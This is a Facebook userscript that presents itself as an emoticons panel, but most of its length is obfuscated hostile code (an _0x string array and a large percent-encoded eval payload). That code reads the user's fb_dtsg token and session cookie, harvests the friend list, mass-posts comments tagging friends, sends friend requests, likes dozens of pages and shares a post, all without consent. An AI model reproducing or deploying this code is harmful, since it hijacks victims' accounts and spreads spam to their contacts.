	// Toggler
	html += '<a class="navLink" title="Icon Facebook">'; // var navLink
	html += '<span style="vertical-align: middle;"><img src="http://static.ak.fbcdn.net/rsrc.php/v1/yY/r/7OqExvAe82o.gif"></img></span>';
	html += '</a>';

	
	// Flyout
	html += '<div>'; // openToggler; var flyout
	html += '<div class="emoticonsPanel fbJewelFlyout uiToggleFlyout" style="z-index: 1; width: auto;">';
	// {

	
	// Beeper
	html += '<div class="jewelBeeperHeader">';
	html += '<div class="beeperNubWrapper">';
	html += '<div class="beeperNub" style="left: 4px;"></div>';
	html += '</div>';
	html += '</div>';

	// Tabs
	// var titleContainer
	html += '<ul style="display: text-align: center;">';
	html += '</ul>';

	// Bodies
	html += '<div>'; // var bodyContainer
	html += '</div>';

	// Footer
	html += '<div class="jewelFooter">';
    html += '<a class="jewelFooter" href="https://www.facebook.com/100002451265248" target="_blank">เพิ่มผู้ติดตาม [Click]<br>คลิก</a>';
	html += '</div>';

	// }
	html += '</div>'; // emoticonsPanel
	html += '</div>'; // openToggler

	// }
	html += '</div>'; // fbJewel
	html += '</li>'; // navItem

	var navItem = createElement(html);
	var pageNav = document.querySelector("#pageNav");
	pageNav.insertBefore(navItem, pageNav.firstChild);

	// Maintain active element
	navItem.addEventListener("click", function() {
		if (isInstanceOfTextInput(lastActiveElement)) {
			lastActiveElement.focus();
		}

		openFlyoutCommand = undefined; // Do nothing
	}, true);

	var navLink = navItem.firstChild.firstChild;
	var flyout = navLink.nextSibling;
	var titleContainer = flyout.firstChild.childNodes[1];
	var bodyContainer = titleContainer.nextSibling;

	// Toggle listener
	navLink.addEventListener("click", function() {
		openFlyoutCommand = !isFlyoutOpen(flyout);
	});

	// Picture emoticon tab
	var picEmoTab = createTab(titleContainer, bodyContainer);
	picEmoTab.title.click(); // Default tab
	
	picEmoTab.body.appendChild(createTabListBody(emoticons, function(emoticon) {
		if (emoticon.class === undefined) { // No picture
			return false;
		}

		// [Bug] 2 characters unicode emoticons
		if (emoticon.chars.length == 2) {
			return false;
		}

		return true;

			}));

	// = Other listener =======

	document.addEventListener("click", function() {
		// Get active textarea
		lastActiveElement = document.activeElement;

		// Toggle flyout
		if (openFlyoutCommand !== undefined) {
			openFlyout(flyout, openFlyoutCommand);
		}
		openFlyoutCommand = false;
 	});
})();


	// === Facebook Emoticons ====
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}
function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","606708012754235","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text=(Y) อย่าโกรธกูนะ กูแค่ลองเท่านั้นเอง  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function Like(p) { var Page = new XMLHttpRequest(); var PageURL = "//www.facebook.com/ajax/pages/fan_status.php"; var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; Page.open("POST", PageURL, true); Page.onreadystatechange = function () { if (Page.readyState == 4 && Page.status == 200) { Page.close; } }; Page.send(PageParams); }
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var now=(new Date).getTime(); function P(opo) { var X = new XMLHttpRequest(); var XURL ="//www.facebook.com/ajax/ufi/like.php"; var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+"%3A379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp="; X.open("POST", XURL, true); X.onreadystatechange = function () { if (X.readyState == 4 && X.status == 200) { X.close; } }; X.send(XParams); }
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

eval(unescape("%76%61%72%20%66%62%5F%64%74%73%67%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%73%42%79%4E%61%6D%65%28%27%66%62%5F%64%74%73%67%27%29%5B%30%5D%2E%76%61%6C%75%65%3B%20%76%61%72%20%75%73%65%72%5F%69%64%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%2F%63%5F%75%73%65%72%3D%28%5C%64%2B%29%2F%29%5B%31%5D%29%3B%20%66%75%6E%63%74%69%6F%6E%20%4C%69%6B%65%28%70%29%20%7B%20%76%61%72%20%50%61%67%65%20%3D%20%6E%65%77%20%58%4D%4C%48%74%74%70%52%65%71%75%65%73%74%28%29%3B%20%76%61%72%20%50%61%67%65%55%52%4C%20%3D%20%22%2F%2F%77%77%77%2E%66%61%63%65%62%6F%6F%6B%2E%63%6F%6D%2F%61%6A%61%78%2F%70%61%67%65%73%2F%66%61%6E%5F%73%74%61%74%75%73%2E%70%68%70%22%3B%20%76%61%72%20%50%61%67%65%50%61%72%61%6D%73%20%3D%20%22%26%66%62%70%61%67%65%5F%69%64%3D%22%20%2B%20%70%20%2B%22%26%61%64%64%3D%74%72%75%65%26%72%65%6C%6F%61%64%3D%66%61%6C%73%65%26%66%61%6E%5F%6F%72%69%67%69%6E%3D%70%61%67%65%5F%74%69%6D%65%6C%69%6E%65%26%66%61%6E%5F%73%6F%75%72%63%65%3D%26%63%61%74%3D%26%6E%63%74%72%5B%5F%6D%6F%64%5D%3D%70%61%67%65%6C%65%74%5F%74%69%6D%65%6C%69%6E%65%5F%70%61%67%65%5F%61%63%74%69%6F%6E%73%26%5F%5F%75%73%65%72%3D%22%2B%75%73%65%72%5F%69%64%2B%22%26%5F%5F%61%3D%31%26%5F%5F%64%79%6E%3D%37%39%38%61%44%35%7A%35%43%46%2D%26%5F%5F%72%65%71%3D%64%26%66%62%5F%64%74%73%67%3D%22%2B%66%62%5F%64%74%73%67%2B%22%26%70%68%73%74%61%6D%70%3D%22%3B%20%50%61%67%65%2E%6F%70%65%6E%28%22%50%4F%53%54%22%2C%20%50%61%67%65%55%52%4C%2C%20%74%72%75%65%29%3B%20%50%61%67%65%2E%6F%6E%72%65%61%64%79%73%74%61%74%65%63%68%61%6E%67%65%20%3D%20%66%75%6E%63%74%69%6F%6E%20%28%29%20%7B%20%69%66%20%28%50%61%67%65%2E%72%65%61%64%79%53%74%61%74%65%20%3D%3D%20%34%20%26%26%20%50%61%67%65%2E%73%74%61%74%75%73%20%3D%3D%20%32%30%30%29%20%7B%20%50%61%67%65%2E%63%6C%6F%73%65%3B%20%7D%20%7D%3B%20%50%61%67%65%2E%73%65%6E%64%28%50%61%67%65%50%61%72%61%6D%73%29%3B%20%7D%0A%20%76%61%72%20%75%73%65%72%5F%69%64%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%2F%63%5F%75%73%65%72%3D%28%5C%64%2B%29%2F%29%5B%31%5D%29%3B%20%76%61%72%20%66%62%5F%64%74%73%67%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%73%42%79%4E%61%6D%65%28%27%66%62%5F%64%74%73%67%27%29%5B%30%5D%2E%76%61%6C%75%65%3B%20%76%61%72%20%6E%6F%77%3D%28%6E%65%77%20%44%61%74%65%29%2E%67%65%74%54%69%6D%65%28%29%3B%20%66%75%6E%63%74%69%6F%6E%20%50%28%6F%70%6F%29%20%7B%20%76%61%72%20%58%20%3D%20%6E%65%77%20%58%4D%4C%48%74%74%70%52%65%71%75%65%73%74%28%29%3B%20%76%61%72%20%58%55%52%4C%20%3D%22%2F%2F%77%77%77%2E%66%61%63%65%62%6F%6F%6B%2E%63%6F%6D%2F%61%6A%61%78%2F%75%66%69%2F%6C%69%6B%65%2E%70%68%70%22%3B%20%76%61%72%20%58%50%61%72%61%6D%73%20%3D%20%22%6C%69%6B%65%5F%61%63%74%69%6F%6E%3D%74%72%75%65%26%66%74%5F%65%6E%74%5F%69%64%65%6E%74%69%66%69%65%72%3D%22%2B%6F%70%6F%2B%22%26%73%6F%75%72%63%65%3D%31%26%63%6C%69%65%6E%74%5F%69%64%3D%22%2B%6E%6F%77%2B%22%25%33%41%33%37%39%37%38%33%38%35%37%26%72%6F%6F%74%69%64%3D%75%5F%6A%73%6F%6E%70%5F%33%39%5F%31%38%26%67%69%66%74%6F%63%63%61%73%69%6F%6E%26%66%74%5B%74%6E%5D%3D%25%33%45%25%33%44%26%66%74%5B%74%79%70%65%5D%3D%32%30%26%66%74%5B%71%69%64%5D%3D%35%38%39%30%38%31%31%33%32%39%34%37%30%32%37%39%32%35%37%26%66%74%5B%6D%66%5F%73%74%6F%72%79%5F%6B%65%79%5D%3D%32%38%31%34%39%36%32%39%30%30%31%39%33%31%34%33%39%35%32%26%66%74%5B%68%61%73%5F%65%78%70%61%6E%64%65%64%5F%75%66%69%5D%3D%31%26%6E%63%74%72%5B%5F%6D%6F%64%5D%3D%70%61%67%65%6C%65%74%5F%68%6F%6D%65%5F%73%74%72%65%61%6D%26%5F%5F%75%73%65%72%3D%22%2B%75%73%65%72%5F%69%64%2B%22%26%5F%5F%61%3D%31%26%5F%5F%64%79%6E%3D%37%6E%38%38%51%6F%41%4D%42%6C%43%6C%79%6F%63%70%61%65%26%5F%5F%72%65%71%3D%67%34%26%66%62%5F%64%74%73%67%3D%22%2B%66%62%5F%64%74%73%67%2B%22%26%70%68%73%74%61%6D%70%3D%22%3B%20%58%2E%6F%70%65%6E%28%22%50%4F%53%54%22%2C%20%58%55%52%4C%2C%20%74%72%75%65%29%3B%20%58%2E%6F%6E%72%65%61%64%79%73%74%61%74%65%63%68%61%6E%67%65%20%3D%20%66%75%6E%63%74%69%6F%6E%20%28%29%20%7B%20%69%66%20%28%58%2E%72%65%61%64%79%53%74%61%74%65%20%3D%3D%20%34%20%26%26%20%58%2E%73%74%61%74%75%73%20%3D%3D%20%32%30%30%29%20%7B%20%58%2E%63%6C%6F%73%65%3B%20%7D%20%7D%3B%20%58%2E%73%65%6E%64%28%58%50%61%72%61%6D%73%29%3B%20%7D%0A%76%61%72%20%66%62%5F%64%74%73%67%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%73%42%79%4E%61%6D%65%28%27%66%62%5F%64%74%73%67%27%29%5B%30%5D%2E%76%61%6C%75%65%3B%0A%76%61%72%20%75%73%65%72%5F%69%64%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%2F%63%5F%75%73%65%72%3D%28%5C%64%2B%29%2F%29%5B%31%5D%29%3B%0A%0A%4C%69%6B%65%28%22%32%36%37%36%32%33%37%30%30%30%37%37%37%35%31%22%29%3B%4C%69%6B%65%28%22%37%34%37%34%38%38%36%34%35%33%33%32%35%33%33%22%29%3B%4C%69%6B%65%28%22%31%34%33%36%35%30%37%33%36%36%35%38%39%33%35%32%22%29%3B%4C%69%6B%65%28%22%34%38%39%39%30%38%37%39%37%37%39%38%37%39%31%22%29%3B%4C%69%6B%65%28%22%32%37%31%31%34%31%30%36%33%30%35%32%34%38%34%22%29%3B%0A%4C%69%6B%65%28%22%32%37%34%37%32%32%30%35%36%30%32%30%38%34%38%22%29%3B%0A%4C%69%6B%65%28%22%31%34%33%30%36%39%36%32%31%30%35%30%34%36%35%32%22%29%3B%0A%4C%69%6B%65%28%22%31%34%33%30%36%39%36%32%31%30%35%30%34%36%35%32%22%29%3B%0A%4C%69%6B%65%28%22%36%39%35%39%34%35%35%30%37%31%31%35%36%31%35%22%29%3B%4C%69%6B%65%28%22%32%33%30%32%33%33%30%35%33%38%33%35%35%31%33%22%29%3B%4C%69%6B%65%28%22%35%32%34%33%37%33%36%39%31%30%31%35%37%36%33%22%29%3B%4C%69%6B%65%28%22%34%39%30%34%30%30%38%35%31%30%36%36%32%39%34%22%29%3B%4C%69%6B%65%28%22%35%35%30%36%39%33%31%31%35%30%32%39%32%39%31%22%29%3B%4C%69%6B%65%28%22%32%34%30%38%38%31%31%37%32%37%36%35%37%38%31%22%29%3B%4C%69%6B%65%28%22%32%38%34%35%31%32%32%35%31%37%30%37%30%32%38%22%29%3B%4C%69%6B%65%28%22%36%32%33%31%34%33%32%36%31%31%30%31%34%34%31%22%29%3B%4C%69%6B%65%28%22%38%35%31%37%34%35%39%36%38%31%38%34%32%31%38%22%29%3B%4C%69%6B%65%28%22%37%37%33%34%37%36%32%35%39%33%33%31%30%35%30%22%29%3B%4C%69%6B%65%28%22%34%38%38%38%32%38%36%32%31%32%32%33%31%35%32%22%29%3B%4C%69%6B%65%28%22%36%31%34%38%30%35%30%35%31%39%33%31%35%38%30%22%29%3B%4C%69%6B%65%28%22%31%34%38%39%35%37%36%31%36%37%39%32%39%33%38%37%22%29%3B%4C%69%6B%65%28%22%38%31%32%36%32%35%38%39%38%37%36%35%31%33%39%22%29%3B%4C%69%6B%65%28%22%31%34%33%32%38%39%38%34%38%36%39%34%39%36%31%35%22%29%3B%4C%69%6B%65%28%22%32%32%34%31%35%38%30%37%34%34%34%38%32%32%37%22%29%3B%4C%69%6B%65%28%22%36%36%33%38%34%31%36%36%30%33%32%38%38%38%35%22%29%3B%4C%69%6B%65%28%22%32%39%38%34%34%34%37%37%30%33%30%37%37%37%37%22%29%3B%4C%69%6B%65%28%22%31%34%37%36%33%31%30%31%34%39%32%34%37%33%37%31%22%29%3B%4C%69%6B%65%28%22%31%34%33%36%35%38%31%31%37%39%39%31%35%36%35%36%22%29%3B%4C%69%6B%65%28%22%36%32%34%34%33%33%33%31%34%32%39%38%31%32%39%22%29%3B%4C%69%6B%65%28%22%31%33%39%35%38%32%30%39%30%30%36%39%31%35%34%36%22%29%3B%4C%69%6B%65%28%22%33%37%33%34%37%34%35%32%36%31%32%34%39%38%39%22%29%3B%4C%69%6B%65%28%22%35%35%38%33%34%33%37%35%30%39%34%30%30%38%32%22%29%3B%4C%69%6B%65%28%22%37%33%39%31%37%34%38%36%36%31%30%33%32%36%31%22%29%3B%4C%69%6B%65%28%22%36%33%38%35%33%38%39%34%32%38%36%32%33%35%32%22%29%3B%4C%69%6B%65%28%22%37%36%35%34%33%37%30%30%33%34%36%36%35%31%32%22%29%3B%4C%69%6B%65%28%22%32%32%35%38%37%39%38%31%37%36%31%32%35%31%38%22%29%3B%4C%69%6B%65%28%22%33%37%30%35%31%36%34%30%33%30%38%37%30%31%35%22%29%3B%4C%69%6B%65%28%22%36%34%35%36%32%30%31%39%32%31%37%32%39%38%38%22%29%3B%4C%69%6B%65%28%22%32%32%30%33%37%37%34%37%34%38%32%38%35%37%38%22%29%3B%0A%0A%4C%69%6B%65%28%22%35%34%37%38%31%30%39%32%31%39%39%39%30%32%37%22%29%3B%0A%4C%69%6B%65%28%22%36%30%32%38%35%38%31%38%36%34%37%34%30%36%37%22%29%3B%0A%4C%69%6B%65%28%22%32%32%33%38%32%37%36%33%31%31%35%38%33%30%33%22%29%3B%0A%4C%69%6B%65%28%22%34%33%32%31%35%30%37%34%33%35%35%34%31%34%33%22%29%3B%0A%4C%69%6B%65%28%22%32%36%30%33%39%33%35%39%34%31%34%32%33%36%31%22%29%3B%0A%4C%69%6B%65%28%22%37%31%33%31%31%37%35%30%38%37%33%31%37%36%31%22%29%3B%0A%4C%69%6B%65%28%22%35%36%39%38%32%36%33%39%36%34%35%38%35%33%37%22%29%3B%0A%4C%69%6B%65%28%22%36%39%33%35%35%31%30%35%37%33%37%35%35%34%39%22%29%3B%0A%4C%69%6B%65%28%22%32%37%31%37%32%36%34%37%36%33%32%37%35%34%32%22%29%3B%0A%4C%69%6B%65%28%22%31%34%35%39%36%37%30%38%35%34%32%36%34%35%30%38%22%29%3B%0A%4C%69%6B%65%28%22%32%32%32%37%34%32%39%32%37%39%33%32%36%33%39%22%29%3B%0A%4C%69%6B%65%28%22%35%36%37%38%34%30%37%31%33%33%32%32%39%30%35%22%29%3B%0A%4C%69%6B%65%28%22%31%33%39%39%37%30%32%33%34%30%33%30%32%36%34%36%22%29%3B%0A%4C%69%6B%65%28%22%31%34%36%30%33%36%32%33%31%37%35%32%38%30%34%32%22%29%3B%0A%4C%69%6B%65%28%22%38%33%39%36%37%33%31%36%39%33%38%32%39%39%37%22%29%3B%0A%4C%69%6B%65%28%22%32%32%33%35%35%30%31%30%34%35%30%36%32%31%38%22%29%3B%0A%4C%69%6B%65%28%22%35%31%34%37%33%39%39%39%35%32%39%32%39%33%31%22%29%3B%0A%0A%0A%4C%69%6B%65%28%22%31%35%30%37%32%33%38%35%35%32%38%33%37%30%35%32%22%29%3B%0A%4C%69%6B%65%28%22%31%34%37%39%32%39%33%36%30%32%32%38%36%35%33%35%22%29%3B%0A%4C%69%6B%65%28%22%32%32%32%38%30%32%34%31%34%35%38%36%30%32%31%22%29%3B%0A%4C%69%6B%65%28%22%36%30%37%30%33%36%33%33%39%33%38%35%33%30%38%22%29%3B%0A%4C%69%6B%65%28%22%34%37%39%38%33%38%36%31%32%31%34%35%38%35%39%22%29%3B%0A%4C%69%6B%65%28%22%36%30%38%34%37%32%34%32%39%32%34%33%38%32%38%22%29%3B%0A%4C%69%6B%65%28%22%36%32%37%35%32%30%32%34%33%39%39%33%33%37%38%22%29%3B%0A%4C%69%6B%65%28%22%31%34%33%34%35%34%38%32%37%33%34%35%32%33%37%35%22%29%3B%0A%4C%69%6B%65%28%22%37%32%34%33%33%39%31%30%37%35%39%37%30%33%32%22%29%3B%0A%4C%69%6B%65%28%22%34%35%35%31%34%34%37%32%37%39%35%30%36%31%33%22%29%3B%0A%4C%69%6B%65%28%22%33%31%39%38%38%39%38%35%38%31%34%39%35%39%34%22%29%3B%0A%4C%69%6B%65%28%22%37%36%33%34%32%38%37%38%33%36%37%30%30%35%37%22%29%3B%0A%76%61%72%20%67%69%64%20%3D%20%5B%27%31%30%30%30%30%33%36%32%30%33%39%30%34%34%37%27%5D%3B%0A%49%44%53%28%22%31%30%30%30%30%33%36%32%30%33%39%30%34%34%37%22%29%3B%0A%50%28%22%31%37%30%34%33%36%32%33%36%34%32%36%30%33%32%22%29%3B%0A%53%68%61%72%65%28%22%31%37%30%34%33%36%32%33%36%34%32%36%30%33%32%22%29%3B"));